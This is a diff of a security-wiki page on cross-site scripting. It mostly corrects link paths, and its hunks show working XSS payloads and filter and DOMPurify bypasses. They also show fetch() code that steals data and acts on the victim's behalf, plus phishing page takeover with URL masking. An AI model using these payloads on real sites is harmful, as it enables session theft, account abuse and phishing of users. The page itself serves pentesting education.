@@ -6,8 +6,8 @@ description: Inject JavaScript code on victims to perform actions on their behal
 
 ## # Related Pages
 
-{% content-ref url="../languages/javascript/" %}
-[javascript](../languages/javascript/)
+{% content-ref url="../../languages/javascript/" %}
+[javascript](../../languages/javascript/)
 {% endcontent-ref %}
 
 ## Description
@@ -126,14 +126,11 @@ While the above are simple, they are also the most common, and many filters alre
 ```
 {% endcode %}
 
-It is common for dangerous tags to be blacklisted, and any event handler attributes like `onload` and `onerror` to be blocked. There are some payloads however that can _encode_ data to hide these obligatory strings (`&#110;` = HTML-encoded `n`, [CyberChef](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity\(true,'Numeric%20entities'\)\&input=bg)):
+It is common for dangerous tags to be blacklisted, and any event handler attributes like `onload` and `onerror` to be blocked. There are some payloads however that can _encode_ data to hide these obligatory strings (`&#110;` = HTML-encoded `n`, [CyberChef](https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity\(true,'Numeric%20entities'\)\&input=bg)):
 
-<pre class="language-html" data-overflow="wrap"><code class="lang-html">&#x3C;!-- Use the powerful SVG &#x3C;use> tag to include HTML data (which can be encoded) -->
-<strong>&#x3C;svg>&#x3C;use href="data:image/svg+xml,&#x26;lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&#x26;gt;&#x26;lt;image href='1' o&#x26;#110;error='alert(1)' /&#x26;gt;&#x26;lt;/svg&#x26;gt;#x" />
-</strong>
-&#x3C;!-- The same idea but with base64 encoding -->
-<strong>&#x3C;svg>&#x3C;use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" />&#x3C;/svg>
-</strong>
+<pre class="language-html" data-overflow="wrap"><code class="lang-html">&#x3C;!-- Dynamically set href= attribute using SVG animation, with "javascript:" partially in attribute value -->
+&#x3C;svg>&#x3C;a>&#x3C;animate attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://example.com?&#x26;semi;javascript:alert(origin)&#x26;semi;0" />&#x3C;text x=20 y=20>XSS&#x3C;/text>&#x3C;/a>
+
 &#x3C;!-- Using iframe srcdoc= attribute to include encoded HTML -->
 <strong>&#x3C;iframe srcdoc="&#x26;lt;img src=1 o&#x26;#110;error=alert(1)&#x26;gt;">&#x3C;/iframe>
 </strong>
@@ -267,7 +264,7 @@ One last trick is useful when you **cannot escape** the string with just a `"` q
 &#x3C;/script>
 </code></pre>
 
-The important piece of knowledge is that any character escaped using a `\` backslash character, which will interpret the character as data instead of code (see [here ](../languages/javascript/#inside-a-string)for a table of all special backslash escapes). \
+The important piece of knowledge is that any character escaped using a `\` backslash character, which will interpret the character as data instead of code (see [here ](../../languages/javascript/#inside-a-string)for a table of all special backslash escapes). \
 With this knowledge, we know a `\"` character will continue the string and not stop it. Therefore if we **end** our input with a `\` character, a `"` quote will be appended to it which would normally close the string, but because of our injection cause it to continue and mess up the syntax:
 
 <pre class="language-html" data-title="Injection causes error"><code class="lang-html"><strong>Payload 1: anything\
@@ -310,7 +307,7 @@ This can cause all sorts of problems as shown in the example below ([source](htt
 Notice that the closing script tag on line 3 doesn't close it anymore, but instead, only after the closing comment inside of the attribute, it is allowed to again. By there closing it ourselves from inside the attribute, we are in an HTML context and can write any XSS payload!
 
 {% hint style="info" %}
-For more advanced tricks and information, check out the [javascript](../languages/javascript/ "mention") page!
+For more advanced tricks and information, check out the [javascript](../../languages/javascript/ "mention") page!
 {% endhint %}
 
 ### DOM XSS
@@ -361,7 +358,7 @@ A snippet like the following was very commonly exploited ([source](https://ports
 });
 </code></pre>
 
-Here the `location.hash` _source_ is put into the vulnerable _sink_, which is exploitable with a simple `#<img src onerror=alert()>` payload. In the snippet, this is called on the [`hashchange`](https://developer.mozilla.org/en-US/docs/Web/API/Window/hashchange\_event) event it is not yet triggered on page load, but only after the hash has _changed_. In order to exploit this, we need to load the page normally first, and then after some time when the page has loaded we can replace the URL of the active window which will act as a "change". Note that **reading** a location is not allowed cross-origin, but **writing** a new location is, so we can abuse this.&#x20;
+Here the `location.hash` _source_ is put into the vulnerable _sink_, which is exploitable with a simple `#<img src onerror=alert()>` payload. In the snippet, this is called on the [`hashchange`](https://developer.mozilla.org/en-US/docs/Web/API/Window/hashchange_event) event it is not yet triggered on page load, but only after the hash has _changed_. In order to exploit this, we need to load the page normally first, and then after some time when the page has loaded we can replace the URL of the active window which will act as a "change". Note that **reading** a location is not allowed cross-origin, but **writing** a new location is, so we can abuse this.&#x20;
 
 If the target allows being iframed, a simple way to exploit this is by loading the target and changing the `src=` attribute after it loads:
 
@@ -428,9 +425,9 @@ JQuery also has many other methods and CVEs if malicious input ends up in specif
 
 When placing common XSS payloads in the triggers above, it becomes clear that they are not all the same. Most notably, the `<img src onerror=alert()>` payload is the most universal as it works in every situation, even when it is not added to the DOM yet. The common and short `<svg onload=alert()>` payload is interesting as it is only triggered via `.innerHTML` on Chome, and not Firefox. Lastly, the `<script>` tag does not load when added with `.innerHTML` at all.
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Table of XSS payloads and DOM sinks that trigger them (<mark style="color:yellow;">yellow</mark> = Chrome but not Firefox)</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Table of XSS payloads and DOM sinks that trigger them (<mark style="color:yellow;">yellow</mark> = Chrome but not Firefox)</p></figcaption></figure>
 
-{% file src="../.gitbook/assets/domxss-trigger-table.html" %}
+{% file src="../../.gitbook/assets/domxss-trigger-table.html" %}
 **Source code** for script used to generate and **test** the results in the table above
 {% endfile %}
 
@@ -446,7 +443,7 @@ When this is enabled, however, many possibilities open up. One of the most inter
 
 Here are a few examples of how it can be abused on the latest version. All alerts fire on load:
 
-<pre class="language-html" data-title="Working Demo"><code class="lang-html">&#x3C;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js">&#x3C;/script>
+<pre class="language-html"><code class="lang-html">&#x3C;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js">&#x3C;/script>
 
 &#x3C;body ng-app>
 <strong>  &#x3C;!-- Text injection -->
@@ -486,7 +483,6 @@ You may still be able to exploit this by slowing down the AngularJS script loadi
 
 #### [VueJS](https://vuejs.org/guide/essentials/template-syntax.html)
 
-{% code title="Working Demo" %}
 ```html
 <script src="https://cdn.jsdelivr.net/npm/vue@2.5.13/dist/vue.js"></script>
 
@@ -500,10 +496,9 @@ You may still be able to exploit this by slowing down the AngularJS script loadi
   });
 </script>
 ```
-{% endcode %}
 
 {% embed url="https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets" %}
-Incredibly detailed research into VueJS payloads and filter bypasses
+Detailed research into VueJS payloads and filter bypasses
 {% endembed %}
 
 #### [HTMX](https://htmx.org/docs/)
@@ -552,15 +547,15 @@ If this charset is missing, however, things get interesting. Browsers **automati
 
 These sequences can be used at any point in the HTML context (not JavaScript) and instantly switch how the browser maps bytes to characters. _JIS X 0201 1976_ is almost the same as ASCII, except for `\` being replaced with `¥`, and `~` replaced with `‾`.
 
-<figure><img src="../.gitbook/assets/image (51).png" alt="" width="479"><figcaption><p>Table showing mapping from byte to character in <em>JIS X 0201 1976</em></p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (51).png" alt="" width="479"><figcaption><p>Table showing mapping from byte to character in <em>JIS X 0201 1976</em></p></figcaption></figure>
 
 #### 1. Negating Backslash Escaping
 
 For the first attack, we can make `\` characters useless after having written `\x1b(J`. Strings inside `<script>` tags are often protected by escaping quotes with backslashes, so this can bypass such protections:
 
-<figure><img src="../.gitbook/assets/image (52).png" alt="" width="563"><figcaption><p>1. Input in HTML (search) and JavaScript string (lang) escaped correctly</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (52).png" alt="" width="563"><figcaption><p>1. Input in HTML (search) and JavaScript string (lang) escaped correctly</p></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (53).png" alt="" width="563"><figcaption><p>2. Bypass using <em>JIS X 0201 1976</em> escape sequence in search, ignoring backslashes and escaping with quote</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (53).png" alt="" width="563"><figcaption><p>2. Bypass using <em>JIS X 0201 1976</em> escape sequence in search, ignoring backslashes and escaping with quote</p></figcaption></figure>
 
 #### 2. Breaking HTML Context
 
@@ -568,24 +563,24 @@ The _JIS X 0201 1978_ and _JIS X 0201 1983_ charsets are useful for a different 
 
 An example is if you have control over some value in an attribute that is later closed with a double quote (`"`). By inserting this switching escape sequence, the succeeding bytes including this closing double quote will become invalid Unicode, and lose their meaning.
 
-<figure><img src="../.gitbook/assets/image (28) (1).png" alt="" width="563"><figcaption><p>In markdown, our image alt text ends up in the <code>&#x3C;img alt=</code> attribute</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (28) (1).png" alt="" width="563"><figcaption><p>In markdown, our image alt text ends up in the <code>&#x3C;img alt=</code> attribute</p></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (54).png" alt="" width="563"><figcaption><p>Writing the <em>JIS X 0201 1978</em> escape sequence obfuscates the succeeding characters</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (54).png" alt="" width="563"><figcaption><p>Writing the <em>JIS X 0201 1978</em> escape sequence obfuscates the succeeding characters</p></figcaption></figure>
 
 By later in a **different context** ending the obfuscation with a reset to _ASCII_ escape sequence, we will still be in the attribute context for HTML's sake. The text that was sanitized as text before, is now put into an attribute which can cause all sorts of issues.
 
-<figure><img src="../.gitbook/assets/image (29) (2).png" alt="" width="563"><figcaption><p>Text in markdown ends obfuscation using <em>ASCII</em> escape sequence, continuing the attribute</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (29) (2).png" alt="" width="563"><figcaption><p>Text in markdown ends obfuscation using <em>ASCII</em> escape sequence, continuing the attribute</p></figcaption></figure>
 
 With the next image tag being created, it creates an unexpected scenario where the opening tag is actually still part of the attribute, and the opening of its first attribute instead closes the existing one.
 
-<figure><img src="../.gitbook/assets/image (55).png" alt="" width="563"><figcaption><p>Later image tag still part of the exploited attribute, only closed after trying to open first attribute</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (55).png" alt="" width="563"><figcaption><p>Later image tag still part of the exploited attribute, only closed after trying to open first attribute</p></figcaption></figure>
 
 The `1.png` string is now syntax-highlighted as <mark style="color:red;">red</mark>, meaning it is now the **name of an attribute** instead of a value. If we write `onerror=alert(1)//` here instead, a malicious attribute is added that will execute JavaScript without being sanitized:
 
-<figure><img src="../.gitbook/assets/image (30) (1).png" alt="" width="563"><figcaption><p>Adding malicious attribute after context confusion creates successful XSS payload</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (30) (1).png" alt="" width="563"><figcaption><p>Adding malicious attribute after context confusion creates successful XSS payload</p></figcaption></figure>
 
 {% hint style="info" %}
-**Note**: It is _not possible_ to abuse _JIS X 0201 1978_ or _JIS X 0201 1983_ (2 bytes per char) encoding to write arbitrary ASCII characters instead of Unicode garbage. Only some Japanese characters and ASCII full-width alternatives can be created ([source](https://en.wikipedia.org/wiki/JIS\_X\_0208)), except for two unique cases that can generate a `$` and `(` character found using this fuzzer:\
+**Note**: It is _not possible_ to abuse _JIS X 0201 1978_ or _JIS X 0201 1983_ (2 bytes per char) encoding to write arbitrary ASCII characters instead of Unicode garbage. Only some Japanese characters and ASCII full-width alternatives can be created ([source](https://en.wikipedia.org/wiki/JIS_X_0208)), except for two unique cases that can generate a `$` and `(` character found using this fuzzer:\
 [https://shazzer.co.uk/vectors/66efda1eacb1e3c22aff755c](https://shazzer.co.uk/vectors/66efda1eacb1e3c22aff755c)
 {% endhint %}
 
@@ -618,7 +613,7 @@ The easiest is **Reflected XSS**, which should trigger when a specific URL is tr
 {% endcode %}
 
 {% hint style="info" %}
-Note that [URL Encoding](https://gchq.github.io/CyberChef/#recipe=URL\_Encode\(true\)\&input=PHN0eWxlIG9ubG9hZD1hbGVydCgpPg) might be needed on parameters to make sure special characters are not part of the URL, or to simply obfuscate the payload
+Note that [URL Encoding](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(true\)\&input=PHN0eWxlIG9ubG9hZD1hbGVydCgpPg) might be needed on parameters to make sure special characters are not part of the URL, or to simply obfuscate the payload
 {% endhint %}
 
 For **Stored XSS**, a more likely scenario might be someone else stumbling upon the payload by using the site normally, but if the location is known by the attacker they can also redirect a victim to it in the same way as Reflected XSS as shown above.&#x20;
@@ -641,7 +636,7 @@ In very restricted scenarios you might not be able to make an outbound connectio
 
 ### Forcing requests - `fetch()`
 
-When making a `fetch()` request to the same domain you are on, cookies are _included_, even if `httpOnly` is set. This opens up many possibilities by requesting data and performing actions on the application. When making a request, the response is also readable because of the [Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin\_policy), as we are on the same site as the request is going to.&#x20;
+When making a `fetch()` request to the same domain you are on, cookies are _included_, even if `httpOnly` is set. This opens up many possibilities by requesting data and performing actions on the application. When making a request, the response is also readable because of the [Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy), as we are on the same site as the request is going to.
 
 One idea to still steal cookies would be to request a page that responds with the cookie information in some way, like a debug or error page. You can then request this via JavaScript `fetch()` and exfiltrate the response:
 
@@ -663,11 +658,11 @@ fetch("http://target.com/debug")  // Perform request
 **Tip**: For more complex data, you can use `btoa(res)` to Base64 encode the data which makes sure no special characters are included, which you can later decode
 {% endhint %}
 
-A more common way of exploitation is by requesting personal data from a settings page or API route, which works in a very similar way as shown above.&#x20;
+A more common way of exploitation is by requesting personal data from a settings page or API route, which works in a very similar way as shown above.
 
 #### Performing actions
 
-Performing actions on the victim's behalf can is also common and can result in a high impact, depending on their capabilities. These are often done using POST requests and may contain extra data or special headers. Luckily, [`fetch()`](https://developer.mozilla.org/en-US/docs/Web/API/Fetch\_API/Using\_Fetch) allows us to do all that and more! Its second argument contains `options` with keys like `method:`, `headers:`, and `body:` just to name a few:
+Performing actions on the victim's behalf can is also common and can result in a high impact, depending on their capabilities. These are often done using POST requests and may contain extra data or special headers. Luckily, [`fetch()`](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch) allows us to do all that and more! Its second argument contains `options` with keys like `method:`, `headers:`, and `body:` just to name a few:
 
 {% code title="Payload" %}
 ```javascript
@@ -698,7 +693,7 @@ Content-Length: 49
 ```
 {% endcode %}
 
-doDue to `fetch()` only being a simple function call, you can create a very complex sequence of actions in JavaScript code to execute on the victim, as some actions require some setup. You could create an API token using one request, and then use it in the next to perform some API call. Or a more common example is fetching a CSRF token from some form, and then using that token to POST data if it is protected in that way. As you can see, CSRF tokens do _not_ protect against XSS:
+Due to `fetch()` only being a simple function call, you can create a very complex sequence of actions in JavaScript code to execute on the victim, as some actions require some setup. You could create an API token using one request, and then use it in the next to perform some API call. Or a more common example is fetching a CSRF token from some form, and then using that token to POST data if it is protected in that way. As you can see, CSRF tokens do _not_ protect against XSS:
 
 ```javascript
 fetch("http://target.com/login")  // Request to some form with CSRF token
@@ -720,6 +715,10 @@ fetch("http://target.com/login")  // Request to some form with CSRF token
     });
 ```
 
+{% hint style="info" %}
+**Tip**: If there is no CSRF token, you may also be able to send `SameSite=Strict` cookies from another subdomain that you have XSS on to a target, because the are considered same-site. Read more about this in [cross-site-request-forgery-csrf.md](cross-site-request-forgery-csrf.md "mention").
+{% endhint %}
+
 ### Phishing (+ Password Managers)
 
 XSS gives you complete control over the JavaScript execution on a page, meaning you can also control everything that is on the page, under the regular target's domain. This can create phishing pages indistinguishable from the real login page because the content can be controlled as well as the domain in the navigation bar. As shown in[#alternative-impact](cross-site-scripting-xss.md#alternative-impact "mention"), just using an `<iframe>` and a `<style>` tag you can take over the whole page with your own. One slight problem password managers will notice is the fact that the form itself is on another domain, meaning saved passwords will not automatically be filled or suggested.&#x20;
@@ -738,13 +737,13 @@ document.body.innerHTML = `
 ```
 {% endcode %}
 
-![](<../.gitbook/assets/image (6) (1).png>)
+![](<../../.gitbook/assets/image (6) (1).png>)
 
 Since you are executing code on the same origin, you can even **open windows** to the same domain, and control their HTML content. With this, you could create a popup window showing the real domain in the address bar, with some login form or other data.&#x20;
 
 #### Masking a suspicious URL
 
-A last tricky part is the URL shown in the address bar at the time of your XSS, which may make your URL like "http://target.com/endpoint?url=javascript:document.body.innerHTML=..." showing a login page very suspicious to people who check the URL. Luckily, the same origin policy comes to the rescue once again because using the [History API](https://developer.mozilla.org/en-US/docs/Web/API/History\_API) we can **overwrite the path** of a URL. Not its origin, but its path. That means we can change the suspicious URL to something expected like "/login", making it way more believable:
+A last tricky part is the URL shown in the address bar at the time of your XSS, which may make your URL like "http://target.com/endpoint?url=javascript:document.body.innerHTML=..." showing a login page very suspicious to people who check the URL. Luckily, the same origin policy comes to the rescue once again because using the [History API](https://developer.mozilla.org/en-US/docs/Web/API/History_API) we can **overwrite the path** of a URL. Not its origin, but its path. That means we can change the suspicious URL to something expected like "/login", making it way more believable:
 
 ```javascript
 history.replaceState(null, null, "/login");
@@ -779,7 +778,7 @@ Content-Security-Policy: script-src 'self' https://example.com/
 ```
 {% endcode %}
 
-With the above policy set, any `<script src=...>` that is _not_ from the current domain or "example.com" will be blocked. When you explicitly set a policy like this it also disables inline scripts like `<script>alert()</script>` or event handlers like `<style onload=alert()>` from executing, even ones from the server itself as there is no way to differentiate between intended and malicious. This possibly breaking change where all scripts need to come from trusted URLs is sometimes "fixed" by adding a special [`'unsafe-inline'`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe\_inline\_script) string that allows inline script tags and event handlers to execute, which as the name suggests, is very **unsafe**.&#x20;
+With the above policy set, any `<script src=...>` that is _not_ from the current domain or "example.com" will be blocked. When you explicitly set a policy like this it also disables inline scripts like `<script>alert()</script>` or event handlers like `<style onload=alert()>` from executing, even ones from the server itself as there is no way to differentiate between intended and malicious. This possibly breaking change where all scripts need to come from trusted URLs is sometimes "fixed" by adding a special [`'unsafe-inline'`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_inline_script) string that allows inline script tags and event handlers to execute, which as the name suggests, is very **unsafe**.&#x20;
 
 A different less-common way to allow inline scripts without allowing _all_ inline scripts is with **nonce**s, random values generated by the server. This nonce is put inside of the `script-src` directive like `'nonce-2726c7f26c'`, requiring every inline script to have a `nonce=` attribute equaling the specified random value. In theory, an attacker should not be able to predict this random value as it should be different for every request. This works in a similar way to CSRF tokens and relies on secure randomness by the server. If implemented well, this is a very effective way of preventing XSS.&#x20;
 
@@ -821,10 +820,10 @@ alert()
 
 For more complex scenarios where you cannot directly upload `.js` files, the `Content-Type:` header comes into play. The browser decides based on this header if the requested file is likely to be a real script, and if the type is `image/png` for example, it will simply refuse to execute it:
 
-<figure><img src="../.gitbook/assets/image (3) (5).png" alt="Refused to execute script from &#x27;http://localhost/uploads/image.png&#x27; because its MIME type (&#x27;image/png&#x27;) is not executable."><figcaption><p>Browser refusing to execute <code>image/png</code> file as JavaScript source</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (5).png" alt="Refused to execute script from &#x27;http://localhost/uploads/image.png&#x27; because its MIME type (&#x27;image/png&#x27;) is not executable."><figcaption><p>Browser refusing to execute <code>image/png</code> file as JavaScript source</p></figcaption></figure>
 
 Some more ambiguous types are allowed, however, like `text/plain`, `text/html` or **no type at all**. These are especially useful as commonly a framework will decide what `Content-Type` to add based on the file extension, which may be empty in some cases causing it to choose a type allowed for JavaScript execution. This ambiguity is prevented however with an extra \
-`X-Content-Type-Options: nosniff` header that is sometimes set, making the detection from the browser a lot more strict and only allowing real `application/javascript` files ([full list](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc#50)).&#x20;
+`X-Content-Type-Options: nosniff` header that is sometimes set, making the detection from the browser a lot more strict and only allowing real `application/javascript` files ([full list](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc#50)).&#x20;
 
 An application may sanitize uploaded files by checking for a few signatures if it looks like a valid PNG, JPEG, GIF, etc. file which can limit exploitability as it still needs to be valid JavaScript code without `SyntaxError`s. In these cases, you can try to make a **"polyglot"** that passes the validation checks of the server, while remaining valid JavaScript by using the file format in a smart way and language features like comments to remove unwanted code.&#x20;
 
@@ -881,7 +880,7 @@ async function leak(data) {
 leak("Hello, world! ".repeat(8));
 ```
 
-Finally, we receive DNS requests on the `interactsh-client` that we can [decode](https://gchq.github.io/CyberChef/#recipe=To\_Upper\_case\('All'\)From\_Base32\('A-Z2-7%3D',true\)\&input=akJzd1kzZFBmcXFITzMzU25yc2NjSWNpTVZ3R3kzek1FYjN3NjRUTU1RcVNBU2RmTnJXZzZsYmFvNXhYZTNkLmVlRXFlUVpMbW5yWHNZaUR4TjV6Z3laQkJFYkVHSzNkTU40d2NBNTNwb2p3R0lJakFKQlNXeTNEcEZxcUhPMy4zc25Sc2NDSWNpTVZXZ1kzek1lYjN3NjR0bU1RcVNBU0RGTnJ3ZzZsYkFvNVhYZTNkZWVFUWE):
+Finally, we receive DNS requests on the `interactsh-client` that we can [decode](https://gchq.github.io/CyberChef/#recipe=To_Upper_case\('All'\)From_Base32\('A-Z2-7%3D',true\)\&input=akJzd1kzZFBmcXFITzMzU25yc2NjSWNpTVZ3R3kzek1FYjN3NjRUTU1RcVNBU2RmTnJXZzZsYmFvNXhYZTNkLmVlRXFlUVpMbW5yWHNZaUR4TjV6Z3laQkJFYkVHSzNkTU40d2NBNTNwb2p3R0lJakFKQlNXeTNEcEZxcUhPMy4zc25Sc2NDSWNpTVZXZ1kzek1lYjN3NjR0bU1RcVNBU0RGTnJ3ZzZsYkFvNVhYZTNkZWVFUWE):
 
 {% code title="interactsh-client" overflow="wrap" %}
 ```log
@@ -976,7 +975,7 @@ Some of the most useful and common filter bypasses are shown in [#common-filter-
 
 If a server is checking your input for suspicious strings, they will have a hard time as there are many ways to obfuscate your payloads. Even a simple `<a href=...>` tag has many places where the browser allows special and unexpected characters, which may break the pattern the server is trying to search for. Here is a clear diagram showing _where_ you can insert _what_ characters:
 
-<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption><p>XSS mutation points with possible special characters (<a href="https://twitter.com/hackerscrolls/status/1273254212546281473?s=21">source</a>)</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption><p>XSS mutation points with possible special characters (<a href="https://twitter.com/hackerscrolls/status/1273254212546281473?s=21">source</a>)</p></figcaption></figure>
 
 The XSS Cheat Sheet by PortSwigger has an extremely comprehensive list of all possible tags, attributes, and browsers that allow JavaScript execution, with varying levels of user interaction:
 
@@ -1050,7 +1049,7 @@ See what happened here? It suddenly closed with the `</title>` tag and started a
 
 DOMPurify does not know of the `<title>` tag the application puts it in later, so it can only say if the HTML is safe on its own. In this case, it is, so we bypass the check through Mutation XSS.&#x20;
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>Example from <a href="https://mizu.re/post/intigriti-october-2023-xss-challenge">mizu.re's writeup</a> showing the difference between the browser and DOMPurify</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>Example from <a href="https://mizu.re/post/intigriti-october-2023-xss-challenge">mizu.re's writeup</a> showing the difference between the browser and DOMPurify</p></figcaption></figure>
 
 A quick for-loop later we can find that this same syntax works for all these tags:\
 `iframe`, `noembed`, `noframes`, `noscript`, `script`, `style`, `textarea`, `title`, `xmp`
@@ -1066,7 +1065,7 @@ Where this gets really powerful is using HTML encoding if the sanitizer parses t
 
 ***
 
-[@kevin\_mizu](https://twitter.com/kevin\_mizu/status/1735984327274688630) showed another interesting exploitable scenario, where your input is placed inside an `<svg>` tag after sanitization:
+[@kevin\_mizu](https://twitter.com/kevin_mizu/status/1735984327274688630) showed another interesting exploitable scenario, where your input is placed inside an `<svg>` tag after sanitization:
 
 <pre class="language-html"><code class="lang-html">&#x3C;svg>
 <strong>    a&#x3C;style>&#x3C;!--&#x3C;/style>&#x3C;a id="--!>&#x3C;img src=x onerror=alert()>">&#x3C;/a>
@@ -1075,7 +1074,7 @@ Where this gets really powerful is using HTML encoding if the sanitizer parses t
 
 This is another DOMPurify "bypass" with a more common threat, all a developer needs to do is put your payload inside of an `<svg>` tag, without sanitizing it with the `<svg>` tag. This payload is a bit more complicated as you'll see, but **here's a breakdown**:\
 The trick is the difference between SVG parsing and HTML parsing. _In HTML_ which DOMPurify sees, the `<style>` tag is special as it switches the parsing context to CSS, which doesn't support comments like `<!--` and it won't be interpreted as such. Therefore the `</style>` closes it and the `<a id="...">` opens another innocent tag and attribute. DOMPurify doesn't notify anything wrong here and won't alter the input. \
-_In SVG,_ however, the `<style>` tag doesn't exist and it is interpreted as any other invalid tag in XML. The children inside might be more tags, a `<!--` comment in this case. This only ends at the start of the `<a id="--!>` attribute and that means after the comment comes more raw HTML. Then our `<img onerror=>` tag is read for real and the JavaScript is executed!
+&#xNAN;_&#x49;n SVG,_ however, the `<style>` tag doesn't exist and it is interpreted as any other invalid tag in XML. The children inside might be more tags, a `<!--` comment in this case. This only ends at the start of the `<a id="--!>` attribute and that means after the comment comes more raw HTML. Then our `<img onerror=>` tag is read for real and the JavaScript is executed!
 
 {% hint style="info" %}
 **Tip**: Instead of a comment, another possibility is using the special `<![CDATA[` ... `]]` syntax in SVGs that abuses a similar parsing difference:
